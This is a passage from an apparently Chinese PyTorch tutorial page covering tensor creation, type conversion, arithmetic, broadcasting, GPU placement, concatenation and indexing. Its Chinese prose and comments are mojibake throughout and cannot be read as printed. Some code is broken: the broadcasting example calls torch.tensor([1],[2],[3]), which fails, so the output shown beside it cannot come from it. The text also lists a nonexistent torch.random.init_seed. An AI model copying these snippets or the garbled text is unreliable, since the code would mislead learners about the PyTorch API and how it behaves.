åˆ™åˆ›å»ºåŒ…å«æŒ‡å®šå…ƒç´ çš„å¼ é‡</span><br>    data = torch.Tensor([<span class="hljs-number">10</span>])<br>    <span class="hljs-built_in">print</span>(data)<br>    data = torch.Tensor([<span class="hljs-number">10</span>, <span class="hljs-number">20</span>])<br>    <span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-comment"># 3. ä½¿ç”¨å…·ä½“ç±»å‹çš„å¼ é‡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test03</span>():<br>    <span class="hljs-comment"># 1. åˆ›å»º2è¡Œ3åˆ—, dtype ä¸º int32 çš„å¼ é‡</span><br>    data = torch.IntTensor(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 2. æ³¨æ„: å¦‚æœä¼ é€’çš„å…ƒç´ ç±»å‹ä¸æ­£ç¡®, åˆ™ä¼šè¿›è¡Œç±»å‹è½¬æ¢</span><br>    data = torch.IntTensor([<span class="hljs-number">2.5</span>, <span class="hljs-number">3.3</span>])<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 3. å…¶ä»–çš„ç±»å‹</span><br>    data = torch.ShortTensor()  <span class="hljs-comment"># int16</span><br>    data = torch.LongTensor()   <span class="hljs-comment"># int64</span><br>    data = torch.FloatTensor()  <span class="hljs-comment"># float32</span><br>    data = torch.DoubleTensor() <span class="hljs-comment"># float64</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºçº¿æ€§å’Œéšæœºå¼ é‡ï¼š</p><ol><li>torch.arange å’Œ torch.linspace åˆ›å»ºçº¿æ€§å¼ é‡</li><li>torch.random.init_seed å’Œ torch.random.manual_seed éšæœºç§å­è®¾ç½®</li><li>torch.randn åˆ›å»ºéšæœºå¼ é‡</li></ol><ul><li>randå’Œrandnï¼š</li></ul><ol><li>torch.rand(): è¿™ä¸ªå‡½æ•°ç”Ÿæˆä¸€ä¸ªå¼ é‡ï¼Œå…¶ä¸­çš„å€¼æ˜¯åœ¨ $[0, 1)$ åŒºé—´å†…å‡åŒ€åˆ†å¸ƒçš„éšæœºæ•°ã€‚ä½ å¯ä»¥é€šè¿‡æŒ‡å®šå¼ é‡çš„å½¢çŠ¶æ¥ç”Ÿæˆä¸åŒå½¢çŠ¶çš„å¼ é‡ã€‚</li><li>torch.randn(): è¿™ä¸ªå‡½æ•°ç”Ÿæˆä¸€ä¸ªå¼ é‡ï¼Œå…¶ä¸­çš„å€¼æ˜¯ä»æ ‡å‡†æ­£æ€åˆ†å¸ƒï¼ˆå‡å€¼ä¸º0ï¼Œæ ‡å‡†å·®ä¸º1ï¼‰ä¸­éšæœºé‡‡æ ·å¾—åˆ°çš„ã€‚ä½ åŒæ ·å¯ä»¥é€šè¿‡æŒ‡å®šå¼ é‡çš„å½¢çŠ¶æ¥ç”Ÿæˆä¸åŒå½¢çŠ¶çš„å¼ é‡ã€‚<br>Pytorchçš„åŸºæœ¬è¿ç®—æ“ä½œ</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-comment"># 1. åˆ›å»ºçº¿æ€§ç©ºé—´çš„å¼ é‡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test01</span>():<br>    <span class="hljs-comment"># 1. åœ¨æŒ‡å®šåŒºé—´æŒ‰ç…§æ­¥é•¿ç”Ÿæˆå…ƒç´  [start, end, step)</span><br>    data = torch.arange(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 2. åœ¨æŒ‡å®šåŒºé—´æŒ‰ç…§å…ƒç´ ä¸ªæ•°ç”Ÿæˆ</span><br>    data = torch.linspace(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-comment"># 2. åˆ›å»ºéšæœºå¼ é‡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test02</span>():<br>    <span class="hljs-comment"># 1. åˆ›å»ºéšæœºå¼ é‡</span><br>    data = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <span class="hljs-comment"># åˆ›å»º2è¡Œ3åˆ—å¼ é‡</span><br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 2. éšæœºæ•°ç§å­è®¾ç½®</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;éšæœºæ•°ç§å­:&#x27;</span>, torch.random.initial_seed())<br>    torch.random.manual_seed(<span class="hljs-number">100</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;éšæœºæ•°ç§å­:&#x27;</span>, torch.random.initial_seed())<br></code></pre></td></tr></table></figure><p>åˆ›å»º01å¼ é‡</p><ol><li>torch.ones å’Œ torch.ones_like åˆ›å»ºå…¨1å¼ é‡</li><li>torch.zeros å’Œ torch.zeros_like åˆ›å»ºå…¨0å¼ é‡</li><li>torch.full å’Œ torch.full_like åˆ›å»ºå…¨ä¸ºæŒ‡å®šå€¼å¼ é‡</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test01</span>():<br>    <span class="hljs-comment"># 1. åˆ›å»ºæŒ‡å®šå½¢çŠ¶å…¨0å¼ é‡</span><br>    data = torch.zeros(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 2. æ ¹æ®å¼ é‡å½¢çŠ¶åˆ›å»ºå…¨0å¼ é‡</span><br>    data = torch.zeros_like(data)<br>    <span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-comment"># 2. åˆ›å»ºå…¨1å¼ é‡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test02</span>():<br>    <span class="hljs-comment"># 1. åˆ›å»ºæŒ‡å®šå½¢çŠ¶å…¨0å¼ é‡</span><br>    data = torch.ones(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 2. æ ¹æ®å¼ é‡å½¢çŠ¶åˆ›å»ºå…¨0å¼ é‡</span><br>    data = torch.ones_like(data)<br>    <span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-comment"># 3. åˆ›å»ºå…¨ä¸ºæŒ‡å®šå€¼çš„å¼ é‡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test03</span>():<br>    <span class="hljs-comment"># 1. åˆ›å»ºæŒ‡å®šå½¢çŠ¶æŒ‡å®šå€¼çš„å¼ é‡</span><br>    data = torch.full([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-comment"># 2. æ ¹æ®å¼ é‡å½¢çŠ¶åˆ›å»ºæŒ‡å®šå€¼çš„å¼ é‡</span><br>    data = torch.full_like(data, <span class="hljs-number">20</span>)<br>    <span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure><p>å¼ é‡å…ƒç´ ç±»å‹è½¬æ¢</p><ol><li>tensor.type(torch.DoubleTensor)</li><li>torch.double()<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    data = torch.full([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-number">10</span>)<br>    <span class="hljs-comment"># å°† data å…ƒç´ ç±»å‹è½¬æ¢ä¸º float64 ç±»å‹</span><br>    <span class="hljs-comment"># 1. ç¬¬ä¸€ç§æ–¹æ³•</span><br>    data = data.<span class="hljs-built_in">type</span>(torch.DoubleTensor)<br>    <span class="hljs-comment"># è½¬æ¢ä¸ºå…¶ä»–ç±»å‹</span><br>    <span class="hljs-comment"># data = data.type(torch.ShortTensor)</span><br>    <span class="hljs-comment"># data = data.type(torch.IntTensor)</span><br>    <span class="hljs-comment"># data = data.type(torch.LongTensor)</span><br>    <span class="hljs-comment"># data = data.type(torch.FloatTensor)</span><br><br>    <span class="hljs-comment"># 2. ç¬¬äºŒç§æ–¹æ³•</span><br>    data = data.double()<br>    <span class="hljs-comment"># è½¬æ¢ä¸ºå…¶ä»–ç±»å‹</span><br>    <span class="hljs-comment"># data = data.short()</span><br>    <span class="hljs-comment"># data = data.int()</span><br>    <span class="hljs-comment"># data = data.long()</span><br>    <span class="hljs-comment"># data = data.float()</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="å¼ é‡çš„åŸºæœ¬è¿ç®—"><a href="#å¼ é‡çš„åŸºæœ¬è¿ç®—" class="headerlink" title="å¼ é‡çš„åŸºæœ¬è¿ç®—"></a>å¼ é‡çš„åŸºæœ¬è¿ç®—</h2><p>åŸºæœ¬è¿ç®—ä¸­ï¼ŒåŒ…æ‹¬ addã€subã€mulã€divã€neg ç­‰å‡½æ•°ï¼Œä»¥åŠè¿™äº›å‡½æ•°çš„ in-place ç‰ˆæœ¬ã€‚</p><blockquote><p>æ³¨æ„ï¼šæ‰€æœ‰çš„in-placeçš„æ“ä½œå‡½æ•°éƒ½æœ‰ä¸€ä¸ªä¸‹åˆ’çº¿çš„åç¼€ï¼Œå¦‚x.copy_(y)ï¼Œéƒ½ä¼šç›´æ¥æ”¹å˜xçš„å€¼</p></blockquote><p>é˜¿è¾¾ç›ç§¯æŒ‡çš„æ˜¯çŸ©é˜µå¯¹åº”ä½ç½®çš„å…ƒç´ ç›¸ä¹˜ï¼Œç”¨ * è¡¨ç¤ºã€‚<br>ç‚¹ç§¯è¿ç®—æŒ‡ä¸€èˆ¬æ„ä¹‰ä¸Šçš„çŸ©é˜µä¹˜æ³•ï¼Œè¦æ±‚çŸ©é˜µå¯ä¹˜ï¼Œç”¨è¿ç®—ç¬¦ @ è¡¨ç¤ºã€‚<br>torch.matmul å¯¹è¿›è¡Œç‚¹ä¹˜è¿ç®—çš„ä¸¤çŸ©é˜µå½¢çŠ¶æ²¡æœ‰é™å®šï¼Œåˆ©ç”¨å¹¿æ’­æœºåˆ¶è¿›è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test01</span>():<br>    data1 = torch.tensor([[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]])<br>    data2 = torch.tensor([[<span class="hljs-number">5</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">7</span>, <span class="hljs-number">8</span>]])<br>    <span class="hljs-comment"># ç¬¬ä¸€ç§æ–¹å¼</span><br>    data = torch.mul(data1, data2)<br><br>    <span class="hljs-comment"># ç¬¬äºŒç§æ–¹å¼</span><br>    data = data1 * data2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test02</span>():<br>    data1 = torch.tensor([[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>]])<br>    data2 = torch.tensor([[<span class="hljs-number">5</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">7</span>, <span class="hljs-number">8</span>]])<br><br>    <span class="hljs-comment"># ç¬¬ä¸€ç§æ–¹å¼</span><br>    data = data1 @ data2<br><br>    <span class="hljs-comment"># ç¬¬äºŒç§æ–¹å¼</span><br>    data = torch.mm(data1, data2)<br><br>    <span class="hljs-comment"># ç¬¬ä¸‰ç§æ–¹å¼</span><br>    data = torch.matmul(data1, data2)<br></code></pre></td></tr></table></figure><p>å¯¹äºPyTorchçš„å››åˆ™è¿ç®—ä¼šä¼˜å…ˆè¿›è¡Œå…ƒç´ çº§åˆ«çš„æ“ä½œï¼Œå³ä¸¤ä¸ªå¼ é‡ä¹‹é—´å¯¹åº”ä½ç½®å…ƒç´ è¿›è¡Œè¿ç®—ã€‚è¿™å°±è¦æ±‚å¼ é‡æ»¡è¶³åŒå‹æˆ–æ»¡è¶³å¹¿æ’­è§„åˆ™ã€‚</p><p>å’Œä¸€ä¸ªå¸¸æ•°è¿›è¡Œè¿ç®—æ—¶ï¼Œä¼šå°†å¼ é‡ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½è¿›è¡Œè¿ç®—ï¼Œå¯ä»¥çœ‹ä½œå°†å¸¸æ•°å¹¿æ’­ä¸ºåŒå‹å¼ é‡ã€‚</p><ul><li><strong>å¹¿æ’­è§„åˆ™ï¼š</strong></li></ul><p>å¹¿æ’­è§„åˆ™æ˜¯æŒ‡åœ¨è¿›è¡Œå¼ é‡è¿ç®—æ—¶ï¼ŒPyTorchä¼šè‡ªåŠ¨è°ƒæ•´å¼ é‡çš„å½¢çŠ¶ï¼Œä½¿å¾—å®ƒä»¬èƒ½å¤Ÿè¿›è¡Œå…ƒç´ çº§åˆ«çš„æ“ä½œã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œå½“ä¸¤ä¸ªå¼ é‡çš„å½¢çŠ¶ä¸å®Œå…¨åŒ¹é…æ—¶ï¼ŒPyTorchä¼šæ ¹æ®ä¸€ç»„è§„åˆ™å¯¹å®ƒä»¬è¿›è¡Œæ‰©å±•ï¼Œä½¿å®ƒä»¬çš„å½¢çŠ¶èƒ½å¤Ÿå¯¹é½ï¼Œä»è€Œè¿›è¡Œè¿ç®—ã€‚</p><p>å¹¿æ’­è§„åˆ™çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼Œå¦‚æœä¸¤ä¸ªå¼ é‡çš„å½¢çŠ¶åœ¨æŸä¸ªç»´åº¦ä¸Šç›¸åŒï¼Œæˆ–è€…å…¶ä¸­ä¸€ä¸ªå¼ é‡åœ¨æŸä¸ªç»´åº¦ä¸Šçš„é•¿åº¦ä¸º1ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨è¯¥ç»´åº¦ä¸Šè¿›è¡Œå¹¿æ’­ã€‚å¹¿æ’­æ“ä½œä¼šåœ¨è¿™äº›ç»´åº¦ä¸Šå¤åˆ¶å¼ é‡ï¼Œä½¿å…¶å½¢çŠ¶ä¸å¦ä¸€ä¸ªå¼ é‡ç›¸åŒ¹é…ï¼Œä»è€Œè¿›è¡Œè¿ç®—ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œå¹¿æ’­è§„åˆ™åŒ…æ‹¬ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li><p>ç»´åº¦æ•°å¢åŠ ï¼šå¦‚æœä¸¤ä¸ªå¼ é‡çš„ç»´åº¦æ•°ä¸åŒï¼Œä¼šåœ¨è¾ƒå°çš„å¼ é‡çš„å‰é¢æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªç»´åº¦ï¼Œç›´åˆ°ä¸¤ä¸ªå¼ é‡çš„ç»´åº¦æ•°ç›¸åŒã€‚</p></li><li><p>ç»´åº¦é•¿åº¦ä¸º1çš„æ‰©å±•ï¼šå¯¹äºæ¯ä¸ªç»´åº¦ï¼Œå¦‚æœä¸¤ä¸ªå¼ é‡åœ¨è¯¥ç»´åº¦ä¸Šçš„é•¿åº¦ä¸åŒï¼Œä¸”å…¶ä¸­ä¸€ä¸ªå¼ é‡åœ¨è¯¥ç»´åº¦ä¸Šçš„é•¿åº¦ä¸º1ï¼Œå¯ä»¥åœ¨è¯¥ç»´åº¦ä¸Šå¯¹è¯¥å¼ é‡è¿›è¡Œæ‰©å±•ï¼Œä½¿å…¶é•¿åº¦ä¸å¦ä¸€ä¸ªå¼ é‡ç›¸åŒã€‚</p></li><li><p>æ‰©å±•ä¹‹åå½¢çŠ¶ç›¸åŒï¼šç»è¿‡å¹¿æ’­ä¹‹åï¼Œä¸¤ä¸ªå¼ é‡çš„å½¢çŠ¶å¿…é¡»æ˜¯ç›¸åŒçš„æ‰èƒ½è¿›è¡Œå…ƒç´ çº§åˆ«çš„æ“ä½œã€‚</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br>x = torch.tensor([<span class="hljs-number">1</span>],[<span class="hljs-number">2</span>],[<span class="hljs-number">3</span>])<br>y = torch.tensor([[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]])<br><span class="hljs-comment"># æ‰§è¡Œå¹¿æ’­æ“ä½œ</span><br>broadcasted_x, broadcasted_y = torch.broadcast_tensors(x, y)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Broadcasted x:&quot;</span>, broadcasted_x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Broadcasted y:&quot;</span>, broadcasted_y)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Broadcasted x: </span><br><span class="hljs-string">tensor([[1, 1, 1],</span><br><span class="hljs-string">        [2, 2, 2],</span><br><span class="hljs-string">        [3, 3, 3]])</span><br><span class="hljs-string"></span><br><span class="hljs-string">Broadcasted y: </span><br><span class="hljs-string">tensor([[4, 5, 6],</span><br><span class="hljs-string">        [4, 5, 6],</span><br><span class="hljs-string">        [4, 5, 6]])</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="æŒ‡å®šè¿ç®—è®¾å¤‡"><a href="#æŒ‡å®šè¿ç®—è®¾å¤‡" class="headerlink" title="æŒ‡å®šè¿ç®—è®¾å¤‡"></a>æŒ‡å®šè¿ç®—è®¾å¤‡</h2><p>å°†å¼ é‡ç§»åŠ¨åˆ° GPU ä¸Šæœ‰ä¸¤ç§æ–¹æ³•: </p><ol><li>ä½¿ç”¨ cuda æ–¹æ³• </li><li>ç›´æ¥åœ¨ GPU ä¸Šåˆ›å»ºå¼ é‡ </li><li>ä½¿ç”¨ to æ–¹æ³•æŒ‡å®šè®¾å¤‡<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-comment"># 1. ä½¿ç”¨ cuda æ–¹æ³•</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test01</span>():<br>    data = torch.tensor([<span class="hljs-number">10</span>, <span class="hljs-number">20</span> ,<span class="hljs-number">30</span>])<br>    data = data.cuda()<br><br><span class="hljs-comment"># 2. ç›´æ¥å°†å¼ é‡åˆ›å»ºåœ¨ GPU ä¸Š</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test02</span>():<br>    data = torch.tensor([<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>], device=<span class="hljs-string">&#x27;cuda:0&#x27;</span>)<br>    <span class="hljs-comment"># ä½¿ç”¨ cpu å‡½æ•°å°†å¼ é‡ç§»åŠ¨åˆ° cpu ä¸Š</span><br>    data = data.cpu()<br><br><span class="hljs-comment"># 3. ä½¿ç”¨ to æ–¹æ³•</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test03</span>():<br>    data = torch.tensor([<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>])<br>    data = data.to(<span class="hljs-string">&#x27;cuda:0&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ol><h2 id="å¼ é‡ç±»å‹è½¬æ¢"><a href="#å¼ é‡ç±»å‹è½¬æ¢" class="headerlink" title="å¼ é‡ç±»å‹è½¬æ¢"></a>å¼ é‡ç±»å‹è½¬æ¢</h2><ol><li>ä½¿ç”¨ Tensor.numpy å‡½æ•°å¯ä»¥å°†å¼ é‡è½¬æ¢ä¸º ndarray æ•°ç»„ï¼Œä½†æ˜¯å…±äº«å†…å­˜ï¼Œå¯ä»¥ä½¿ç”¨ copy å‡½æ•°é¿å…å…±äº«ã€‚</li><li>ä½¿ç”¨ from_numpy å¯ä»¥å°† ndarray æ•°ç»„è½¬æ¢ä¸º Tensorï¼Œé»˜è®¤å…±äº«å†…å­˜ï¼Œä½¿ç”¨ copy å‡½æ•°é¿å…å…±äº«ã€‚</li><li>ä½¿ç”¨ torch.tensor å¯ä»¥å°† ndarray æ•°ç»„è½¬æ¢ä¸º Tensorï¼Œé»˜è®¤ä¸å…±äº«å†…å­˜ã€‚</li><li>å¯¹äºåªæœ‰ä¸€ä¸ªå…ƒç´ çš„å¼ é‡ï¼Œä½¿ç”¨ item æ–¹æ³•å°†è¯¥å€¼ä»å¼ é‡ä¸­æå–å‡ºæ¥ã€‚</li></ol><h2 id="å¼ é‡æ‹¼æ¥æ“ä½œ"><a href="#å¼ é‡æ‹¼æ¥æ“ä½œ" class="headerlink" title="å¼ é‡æ‹¼æ¥æ“ä½œ"></a>å¼ é‡æ‹¼æ¥æ“ä½œ</h2><ol><li><p>torch.cat å‡½æ•°å¯ä»¥å°†ä¸¤ä¸ªå¼ é‡æ ¹æ®æŒ‡å®šçš„ç»´åº¦æ‹¼æ¥èµ·æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-comment"># ç”Ÿæˆå½¢çŠ¶ä¸º3ï¼Œ5ï¼Œ4çš„ä¸‰ç»´å¼ é‡</span><br><span class="hljs-comment"># ç¬¬0ç»´ï¼ˆä¹Ÿå°±æ˜¯ç»´åº¦ç´¢å¼•ä¸º0çš„ç»´åº¦ï¼‰æ˜¯å¤§å°ä¸º3ï¼Œé€šå¸¸è¡¨ç¤ºè¿™ä¸ªå¼ é‡ä¸­åŒ…å«3ä¸ªæ ·æœ¬æˆ–è€…æ‰¹æ¬¡ã€‚</span><br><span class="hljs-comment"># ç¬¬1ç»´ï¼ˆç»´åº¦ç´¢å¼•ä¸º1çš„ç»´åº¦ï¼‰æ˜¯å¤§å°ä¸º5ï¼Œä»£è¡¨æ¯ä¸ªæ ·æœ¬ä¸­çš„ç‰¹å¾æ•°é‡ã€‚</span><br><span class="hljs-comment"># ç¬¬2ç»´ï¼ˆç»´åº¦ç´¢å¼•ä¸º2çš„ç»´åº¦ï¼‰æ˜¯å¤§å°ä¸º4ï¼Œä»£è¡¨æ¯ä¸ªç‰¹å¾çš„ç»´åº¦æˆ–è€…ç‰¹å¾å‘é‡çš„é•¿åº¦ã€‚</span><br>data1 = torch.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>])<br>data2 = torch.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>])<br><span class="hljs-comment"># æŒ‰ç¬¬0ç»´æ‹¼æ¥</span><br>new_data = torch.cat([data1, data2], dim=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure></li><li><p>torch.stack å‡½æ•°å¯ä»¥å°†ä¸¤ä¸ªå¼ é‡æ ¹æ®æŒ‡å®šçš„ç»´åº¦å åŠ èµ·æ¥ï¼Œä¼šå¢åŠ æ–°çš„ç»´åº¦ã€‚</p></li></ol><p>ä¸¤ä¸ª[2, 2] çš„å¼ é‡å †å ï¼Œäº§ç”Ÿå¤§å°ä¸º [2, 2, 2] çš„å¼ é‡ã€‚</p><h2 id="å¼ é‡ç´¢å¼•æ“ä½œ"><a href="#å¼ é‡ç´¢å¼•æ“ä½œ" class="headerlink" title="å¼ é‡ç´¢å¼•æ“ä½œ"></a>å¼ é‡ç´¢å¼•æ“ä½œ</h2><ol><li><p>ç®€å•è¡Œã€åˆ—ç´¢å¼•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br>data = torch.randint(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br>data[<span class="hljs-number">0</span>]    <span class="hljs-comment"># ç¬¬ä¸€è¡Œ</span><br>data[:, <span class="hljs-number">0</span>]    <span class="hljs-comment"># ç¬¬ä¸€åˆ—</span><br>data[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]    <span class="hljs-comment"># è¿”å›(0, 1) ä½ç½®å³ç¬¬ä¸€è¡Œç¬¬äºŒåˆ—çš„å…ƒç´ ï¼Œè¿”å›ä¸€ä¸ªå¼ é‡</span><br>data[[[<span class="hljs-number">0</span>], [<span class="hljs-number">1</span>]], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]]    <span class="hljs-comment"># è¿”å› 0ã€1 è¡Œçš„ 1ã€2 åˆ—å…±4ä¸ªå…ƒç´ </span><br></code></pre></td></tr></table></figure></li><li><p>èŒƒå›´ç´¢å¼•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å‰3è¡Œçš„å‰2åˆ—æ•°æ®</span><br>data[:<span class="hljs-number">3</span>, :<span class="hljs-number">2</span>]<br><span class="hljs-comment"># ç¬¬2è¡Œåˆ°æœ€åçš„å‰2åˆ—æ•°æ®</span><br>data[<span class="hljs-number">2</span>:, :<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure></li><li><p>å¸ƒå°”ç´¢å¼•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç¬¬ä¸‰åˆ—å¤§äº5çš„è¡Œæ•°æ®ï¼Œè¾“å‡ºæ•´è¡Œ</span><br>data[data[:, <span class="hljs-number">2</span>] &gt; <span class="hljs-number">5</span>]<br><span class="hljs-comment"># ç¬¬äºŒè¡Œå¤§äº5çš„åˆ—æ•°æ®</span><br>data[:, data[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">5</span>]<br></code></pre></td></tr></table></figure></li></ol><h2 id="å¼ é‡å½¢çŠ¶æ“ä½œ"><a href="#å¼ é‡å½¢çŠ¶æ“ä½œ" class="headerlink" title="å¼ 